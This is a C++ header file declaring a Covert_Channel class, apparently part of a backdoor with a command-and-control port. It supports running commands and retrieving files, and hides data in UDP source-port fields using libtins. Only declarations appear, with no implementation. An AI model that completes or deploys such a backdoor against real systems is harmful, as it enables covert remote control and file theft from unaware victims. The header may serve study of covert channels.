#ifndef Covert_Channel_H
#define Covert_Channel_H

#include <string>
#include <vector>
#include <map>
#include <tins/tins.h>
#include <boost/bimap.hpp>

using std::string;
using namespace Tins;

class Covert_Channel
{
public:

    typedef struct Address {
            string ip;
            int port;
    } Address;

    typedef struct Job {
            std::vector<unsigned char> job;
            string command;
            string argument;
            Address address;
    } Job;

    typedef struct HiddenChars {
            unsigned char c1 : 8;
            unsigned char c2 : 8;
    } HiddenChars;

    typedef union DataExtractor {
        uint16_t port;
        HiddenChars hidden;
    } DataExtractor;

    enum CMD { run_cmd, ret_cmd, get_file, ret_file };

    typedef boost::bimap<CMD, string> command_map;
    typedef command_map::value_type cmd_pair;
    typedef std::map<string, Job> jobs_map;

    Covert_Channel();
    void start(string interface);
    void setup(string interface);
    bool handle(PDU& pdu);
    virtual bool parse_command(Job& j) = 0;
    bool udp_send(string dest_ip, int dst_port, std::vector<unsigned char> hidden);
    bool udp_recv(uint16_t source_port, std::vector<unsigned char> payload, Address a);

    command_map cmdMap;
    int cnc_port;
    int backdoor_port;
    string filter;
private:
    bool finish_transfer(string payload_jid_tag);
    bool split_command_argument_with_regex(const string& command_argument, Job& j);

    PacketSender sender;
    jobs_map jobs;
    string server_id_tag;
    string end_transfer_flag;


};

#endif // Covert_Channel_H
